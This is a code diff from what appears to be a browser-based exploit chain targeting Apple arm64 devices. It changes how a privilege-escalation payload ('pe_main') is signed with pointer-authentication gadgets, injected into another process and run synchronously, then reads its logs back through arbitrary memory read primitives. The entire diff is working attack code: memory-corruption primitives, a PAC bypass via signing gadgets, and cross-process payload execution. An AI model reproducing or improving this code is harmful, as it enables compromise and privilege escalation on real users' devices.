@@ -6796,7 +6796,7 @@
       pe_stage1_js_data = gpuCopyBuffer(read64(addrof(pe_stage1_js_data_array) + 0x10n), BigInt(pe_stage1_js_data_array.length));
       pe_stage1_js_len = BigInt(pe_stage1_js_data_array.length);
       LOG("[MPD] pe_stage1_js_data copied, len=" + pe_stage1_js_data_array.length);
-      let pe_main_js_str = getJS('pe_main.js?' + Date.now()); //local version with cache buster
+      let pe_main_js_str = getJS('pe_main_minimal.js?' + Date.now()); // minimal version for MPD
       pe_main_js_data = get_cstring(pe_main_js_str);
       // Calculate UTF-8 byte length (TextEncoder gives us the actual byte count)
       let pe_main_utf8_bytes = new TextEncoder().encode(pe_main_js_str);
@@ -6903,8 +6903,9 @@
     let rw_array_8_addr = mpd_read64(mpd_objectForKeyedSubscript(ctx, "rw_array_8") + 0x8n);
     let control_array_8_addr = mpd_read64(mpd_objectForKeyedSubscript(ctx, "control_array_8") + 0x8n);
     mpd_write64(control_array_8_addr + 0x10n, rw_array_8_addr + 0x10n);
-    let signing_ctx = 0x4911n;
+    let signing_ctx = 0n;
     // Use mpd_pacia (A key) for code pointer
+    // Context 0 matches what JSContext expects for executable code pointers
     let signed_fcall_addr = mpd_pacia(jsvm_isNAN_fcall_gadget, signing_ctx);
     LOG(`[MPD] signed_fcall_addr: ${signed_fcall_addr.hex()}`);
     LOG(`[MPD] isnan_code_ptr: ${isnan_code_ptr.hex()}`);
@@ -6975,8 +6976,27 @@
     LOG(`xpac_gadget:${xpac_gadget.hex()}`);
     mpd_write64(new_func_offsets_buffer + idx * 0x8n, xpac_gadget);
     idx += 0x1n;
-    mpd_evaluateScript_nowait_exit(ctx, pe_main_cfstring);
-    LOG("[MPD] pe spawned (async)");
+    // Use synchronous evaluation to ensure PE executes before worker exits
+    LOG("[MPD] Evaluating pe_main synchronously...");
+    mpd_evaluateScript(ctx, pe_main_cfstring);
+    LOG("[MPD] pe_main evaluated (sync)");
+
+    // Read PE logs from shared buffer
+    LOG("[MPD] Reading PE logs from buffer...");
+    let pe_log_offset = mpd_read64(pe_log_buf_off);
+    LOG(`[MPD] PE log offset: ${pe_log_offset}`);
+    if (pe_log_offset > 0n) {
+      let pe_log_text = "";
+      let max_read = pe_log_offset < 1000n ? pe_log_offset : 1000n;
+      for (let i = 0n; i < max_read; i++) {
+        let ch = mpd_read8(pe_log_buf + i);
+        if (ch === 0) break;
+        pe_log_text += String.fromCharCode(Number(ch));
+      }
+      LOG(`[MPD] PE LOG: ${pe_log_text}`);
+    } else {
+      LOG("[MPD] PE log buffer is empty - PE may not have executed print() or fcall_init() failed");
+    }
     // Note: PE logs cannot be read after nowait_exit because MPD fcall mechanism
     // may be affected. PE runs independently in MPD process.
   }
